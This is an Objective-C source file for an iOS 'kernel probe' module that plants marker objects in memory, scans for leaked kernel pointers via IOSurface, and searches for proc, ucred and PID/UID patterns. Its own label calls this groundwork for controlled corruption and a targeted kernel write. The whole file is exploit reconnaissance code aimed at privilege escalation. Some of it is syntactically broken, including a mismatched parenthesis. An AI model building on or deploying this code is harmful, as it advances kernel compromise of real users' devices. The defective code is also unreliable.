#import "KPMarkerProbeModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <dlfcn.h>
#import <CoreGraphics/CoreGraphics.h>

@interface KPMarkerProbeModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPMarkerProbeModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"marker.probe";
        _title = @"Marker objects (controlled corruption)";
        _subtitle = @"Create marked objects, find in memory, prepare for targeted write";
        _icon = @"flag";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-marker-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · Marker Objects ===\n"];
    [report appendString:@"Step 1: create marked objects, find in memory.\n"];
    [report appendString:@"Step 2: IOSurface shared memory + kernel pointer scan.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d pid=%d\n",
     UIDevice.currentDevice.systemVersion, getuid(), getpid()];

    // Phase 1: create marked buffers
    [report appendString:@"\n--- Phase 1: create marked objects ---\n"];
    #define MARKER_COUNT 8
    #define MARKER_SIZE 4096
    uint8_t *markers[MARKER_COUNT];
    uint32_t markerIDs[MARKER_COUNT];

    for (int i = 0; i < MARKER_COUNT; i++) {
        markers[i] = calloc(1, MARKER_SIZE);
        markerIDs[i] = 0xABCD0001 + i;
        uint32_t *p = (uint32_t *)markers[i];
        for (int j = 0; j < MARKER_SIZE / 4; j++) {
            p[j] = markerIDs[i];
        }
        [report appendFormat:@"marker[%d]: id=0x%08x addr=0x%lx\n",
         i, markerIDs[i], (unsigned long)markers[i]];
    }

    // Phase 2: find markers in memory
    [report appendString:@"\n--- Phase 2: find markers ---\n"];
    {
        vm_address_t sa = 0; vm_size_t ss = 0;
        vm_region_submap_info_data_64_t si;
        mach_msg_type_number_t sc;
        int found = 0;
        while (1) {
            sa = (sa == 0) ? 0 : sa + ss;
            sc = VM_REGION_SUBMAP_INFO_COUNT_64;
            uint32_t d = 0;
            if (vm_region_recurse_64(mach_task_self(), &sa, &ss, &d,
                                      (vm_region_recurse_info_t)&si, &sc) != KERN_SUCCESS) break;
            if (si.is_submap) continue;
            if (!(si.protection & VM_PROT_WRITE)) continue;
            if (ss > 16 * 1024 * 1024) continue;
            volatile uint32_t *p = (volatile uint32_t *)sa;
            size_t words = ss / 4;
            for (size_t j = 0; j < words; j++) {
                for (int m = 0; m < MARKER_COUNT; m++) {
                    if (p[j] == markerIDs[m]) {
                        found++;
                        break;
                    }
                }
            }
        }
        [report appendFormat:@"markers found: %d\n", found];
    }

    // Phase 3: IOSurface + kernel pointer scan
    [report appendString:@"\n--- Phase 3: IOSurface kernel pointer scan ---\n"];
    {
        void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        typedef void *(*ISCreateFn)(void *);
        typedef void (*ISLockFn)(void *, unsigned int, void *);
        typedef void (*ISUnlockFn)(void *, unsigned int, void *);
        typedef void *(*ISGetBaseFn)(void *);
        typedef unsigned long (*ISGetSizeFn)(void *);

        ISCreateFn isCreate = (ISCreateFn)dlsym(isLib, "IOSurfaceCreate");
        ISLockFn isLock = (ISLockFn)dlsym(isLib, "IOSurfaceLock");
        ISUnlockFn isUnlock = (ISUnlockFn)dlsym(isLib, "IOSurfaceUnlock");
        ISGetBaseFn isGetBase = (ISGetBaseFn)dlsym(isLib, "IOSurfaceGetBaseAddress");
        ISGetSizeFn isGetWidth = (ISGetSizeFn)dlsym(isLib, "IOSurfaceGetWidth");
        ISGetSizeFn isGetHeight = (ISGetSizeFn)dlsym(isLib, "IOSurfaceGetHeight");
        ISGetSizeFn isGetBpr = (ISGetSizeFn)dlsym(isLib, "IOSurfaceGetBytesPerRow");

        [report appendFormat:@"IOSurface: create=%p\n", isCreate];

        if (isCreate && isLock && isGetBase) {
            NSDictionary *props = @{
                @"IOSurfaceWidth": @256,
                @"IOSurfaceHeight": @256,
                @"IOSurfaceBytesPerElement": @4,
            };
            void *surface = isCreate((__bridge CFDictionaryRef)props);
            if (surface) {
                isLock(surface, 0, NULL);
                void *base = isGetBase(surface);
                unsigned long bpr = isGetBpr ? isGetBpr(surface) : 1024;
                unsigned long h = isGetHeight ? isGetHeight(surface) : 256;
                unsigned long w = isGetWidth ? isGetWidth(surface) : 256;

                [report appendFormat:@"surface: %p %lux%lu bpr=%lu\n", base, w, h, bpr];

                if (base) {
                    // Render to make kernel use the surface
                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                    CGContextRef ctx = CGBitmapContextCreate(base, w, h, 8, bpr, cs, kCGImageAlphaPremultipliedFirst);
                    if (ctx) {
                        CGContextSetRGBFillColor(ctx, 1.0, 0.0, 0.0, 1.0);
                        CGContextFillRect(ctx, CGRectMake(0, 0, w, h));
                        CGContextFlush(ctx);
                        CGContextRelease(ctx);
                        [report appendString:@"render complete\n"];
                    }
                    CGColorSpaceRelease(cs);

                    // Scan for kernel pointers
                    unsigned int *p = (unsigned int *)base;
                    int kptrs = 0;
                    for (unsigned long j = 0; j < (bpr * h) / 8; j++) {
                        unsigned long long v = ((unsigned long long)p[j*2+1] << 32) | p[j*2];
                        if ((v >> 32) >= 0xffffffe0ULL) {
                            kptrs++;
                            if (kptrs <= 5) {
                                [report appendFormat:@"kptr @ +%lu: 0x%llx\n", j * 8, v];
                            }
                        }
                    }
                    [report appendFormat:@"kernel pointers in surface: %d\n", kptrs];
                    if (kptrs > 0) {
                        [report appendString:@"*** KERNEL POINTERS FOUND ***\n"];
                    }
                }
                isUnlock(surface, 0, NULL);
                CFRelease(surface);
            } else {
                [report appendString:@"IOSurfaceCreate failed\n"];
            }
        } else {
            [report appendString:@"IOSurface functions not available\n"];
        }
    }

    // Phase 4: kernel pointer analysis (recon)
    [report appendString:@"\n--- Phase 4: kernel pointer analysis ---\n"];
    {
        vm_address_t sa = 0; vm_size_t ss = 0;
        vm_region_submap_info_data_64_t si;
        mach_msg_type_number_t sc;

        #define MAX_KPTRS 2048
        uint64_t kptrs[MAX_KPTRS] = {0};
        size_t kptrLocs[MAX_KPTRS] = {0};
        int nkptrs = 0;

        while (1) {
            sa = (sa == 0) ? 0 : sa + ss;
            sc = VM_REGION_SUBMAP_INFO_COUNT_64;
            uint32_t d = 0;
            if (vm_region_recurse_64(mach_task_self(), &sa, &ss, &d,
                                      (vm_region_recurse_info_t)&si, &sc) != KERN_SUCCESS) break;
            if (si.is_submap) continue;
            if (!(si.protection & VM_PROT_WRITE)) continue;
            if (ss > 16 * 1024 * 1024) continue;

            volatile uint64_t *p = (volatile uint64_t *)sa;
            size_t words = ss / 8;
            for (size_t j = 0; j < words && nkptrs < MAX_KPTRS; j++) {
                uint64_t v = p[j];
                if ((v >> 32) >= 0xffffffe0ULL) {
                    kptrs[nkptrs] = v;
                    kptrLocs[nkptrs] = sa + j * 8;
                    nkptrs++;
                }
            }
        }

        [report appendFormat:@"total kernel pointers: %d\n", nkptrs];

        // Cluster by kernel address range (1MB buckets)
        #define MAX_CLUSTERS 64
        uint64_t clusterBase[MAX_CLUSTERS] = {0};
        int clusterCount[MAX_CLUSTERS] = {0};
        int nclusters = 0;

        for (int i = 0; i < nkptrs; i++) {
            uint64_t bucket = kptrs[i] & ~0xFFFFFULL;
            BOOL found = NO;
            for (int c = 0; c < nclusters; c++) {
                if (clusterBase[c] == bucket) {
                    clusterCount[c]++;
                    found = YES;
                    break;
                }
            }
            if (!found && nclusters < MAX_CLUSTERS) {
                clusterBase[nclusters] = bucket;
                clusterCount[nclusters] = 1;
                nclusters++;
            }
        }

        [report appendFormat:@"kernel clusters (1MB): %d\n", nclusters];
        for (int c = 0; c < nclusters && c < 10; c++) {
            [report appendFormat:@"  cluster 0x%llx: %d ptrs\n", clusterBase[c], clusterCount[c]];
        }

        // Look for proc-like patterns: specific gaps (PID=0x60, ucred=0x28, task=0x08)
        [report appendString:@"\nproc-like patterns (specific gaps):\n"];
        int procCands = 0;
        for (int i = 0; i < nkptrs && procCands < 10; i++) {
            uint64_t a = kptrs[i];
            if (a == 0xFFFFFFFFFFFFFFFFULL || a == 0) continue;
            for (int j = i + 1; j < nkptrs; j++) {
                uint64_t b = kptrs[j];
                if (b == 0xFFFFFFFFFFFFFFFFULL || b == 0) continue;
                uint64_t diff = (a > b) ? a - b : b - a;
                // Look for exact struct offsets
                if (diff == 0x60 || diff == 0x28 || diff == 0x08 || diff == 0x18) {
                    uint64_t lo = (a < b) ? a : b;
                    [report appendFormat:@"  pair: 0x%llx and 0x%llx (gap=0x%llx)\n", a, b, diff];
                    procCands++;
                    if (procCands >= 10) break;
                }
            }
        }
        [report appendFormat:@"proc-like pairs found: %d\n", procCands];

        // Detailed pair analysis
        if (procCands > 0) {
            [report appendString:@"\n--- pair detail analysis ---\n"];
            int myPID = getpid();
            int myUID = getuid();
            [report appendFormat:@"our pid=%d uid=%d\n", myPID, myUID];

            for (int i = 0; i < nkptrs; i++) {
                uint64_t a = kptrs[i];
                if (a == 0xFFFFFFFFFFFFFFFFULL || a == 0) continue;
                for (int j = i + 1; j < nkptrs; j++) {
                    uint64_t b = kptrs[j];
                    if (b == 0xFFFFFFFFFFFFFFFFULL || b == 0) continue;
                    uint64_t diff = (a > b) ? a - b : b - a;
                    if (diff == 0x60 || diff == 0x28 || diff == 0x08 || diff == 0x18) {
                        uint64_t lo = (a < b) ? a : b;
                        [report appendFormat:@"PAIR: lo=0x%llx hi=0x%llx gap=0x%llx\n", lo, lo + diff, diff];
                        [report appendFormat:@"  user loc: 0x%lx and 0x%lx\n",
                         (unsigned long)kptrLocs[i], (unsigned long)kptrLocs[j]];

                        // Check if either value looks like our PID/UID
                        uint32_t a32 = (uint32_t)(a & 0xFFFFFFFF);
                        uint32_t b32 = (uint32_t)(b & 0xFFFFFFFF);
                        if (a32 == (uint32_t)myPID || b32 == (uint32_t)myPID) {
                            [report appendFormat:@"  *** PID MATCH! ***\n"];
                        }
                        if (a32 == (uint32_t)myUID || b32 == (uint32_t)myUID) {
                            [report appendFormat:@"  *** UID MATCH! ***\n");
                        }
                    }
                }
            }
        }

        // Also show kernel heap pointers (most likely proc/task)
        [report appendString:@"\nkernel heap pointers (0xffffffe0...):\n"];
        int heapPtrs = 0;
        for (int i = 0; i < nkptrs && heapPtrs < 10; i++) {
            if ((kptrs[i] >> 32) == 0xffffffe0ULL || (kptrs[i] >> 32) == 0xffffffe1ULL) {
                [report appendFormat:@"  heap kptr: 0x%llx at +0x%lx\n", kptrs[i], (unsigned long)kptrLocs[i]];
                heapPtrs++;
            }
        }
        [report appendFormat:@"heap pointers found: %d\n", heapPtrs];
    }

    // Cleanup
    for (int i = 0; i < MARKER_COUNT; i++) {
        free(markers[i]);
    }

    [report appendString:@"\nVERDICT: RECON_COMPLETE\n"];
    return report;
}

@end
